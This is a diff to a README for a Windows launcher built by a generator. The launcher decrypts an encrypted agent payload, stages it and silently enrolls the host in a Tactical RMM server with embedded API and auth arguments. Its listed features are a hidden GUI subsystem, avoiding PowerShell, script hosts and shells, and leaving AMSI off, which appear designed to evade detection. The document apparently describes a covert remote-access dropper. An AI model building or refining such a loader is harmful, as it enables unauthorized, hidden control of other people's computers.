@@ -6,10 +6,12 @@ ZIP bundle actually enrolls a device end-to-end on a stock Windows host:
 - **runs on stock Windows** — no Mono/.NET runtime, no file-association hack
   (fixes the earlier "device not added" runtime gap).
 - **auto-enrolls** — the launcher does not stop at staging: it stages the
-  decrypted agent to `<outDir>\_stg_<TAG>.exe`, silently installs it
-  (`/VERYSILENT /SUPPRESSMSGBOXES`), then runs the `enroll` value carried
-  inside the encrypted config (`tacticalrmm.exe -m install --api … --auth …`)
-  via `CreateProcess` — zero manual steps.
+  decrypted agent to `<outDir>\_stg_<TAG>.exe`, waits ~6s for it to settle, then
+  runs the **staged payload itself** with the full `enroll` argv
+  (`-m install --api … --client-id … --site-id … --agent-type … --auth …`)
+  via `CreateProcess` — zero manual steps. No `/VERYSILENT` run and no reliance
+  on a fixed `C:\Program Files\TacticalAgent\tacticalrmm.exe` path (the staged
+  payload is a raw agent transport binary, not an Inno installer).
 - **no console, no PowerShell, no script host, no shell invocation** — compiled
   with `-mwindows` (PE Subsystem 2 / GUI); `enroll` is parsed (never run
   through a shell) and handed to `CreateProcess`. AMSI default stays `none`.
@@ -22,7 +24,7 @@ the decryption in C, so pooled server stamps keep working.
 
 | file | purpose |
 |---|---|
-| `launcher.c`   | entry point: self-locate → decrypt → stage → silent-install → auto-enroll (or `SELFTEST`) |
+| `launcher.c`   | entry point: self-locate → decrypt → stage → settle-wait → run staged payload with the `enroll` argv (or `SELFTEST`) |
 | `overlay.c`    | LOCKED VNTR overlay reader + AES-256-CTR envelope/config/payload decrypt |
 | `aes256.c/.h`  | AES-256 (encrypt block) + CTR with big-endian 128-bit counter (byte-identical to template.cs/OpenSSL) |
 | `config.c`     | percent-decoded config parser; quote-aware tokenizer for the `enroll` line |
@@ -64,7 +66,7 @@ cmp <outPayload.bin> <sourcePayload.bin>       # -> byte-identical (crypto proof
 - `enroll` PS-style line parsed to the correct `[exe] + argv`
   (`C:\Program Files\TacticalAgent\tacticalrmm.exe -m install …`) for `CreateProcess`.
 - VPS cross-compile (`x86_64-w64-mingw32-gcc`): `file → PE32+ executable (GUI)`,
-  byte-level Subsystem=2, `CreateProcessA`/`/VERYSILENT`/marker strings present.
+  byte-level Subsystem=2, `CreateProcessA`/`-m install`/marker strings present.
 - `generator/src/launcher-pool.ts peSubsystem()` fixed to read Subsystem at +68 for
   both PE32 and PE32+ (the old +72 for 0x20b read `DllCharacteristics` and would
   have discarded a 64-bit native launcher).
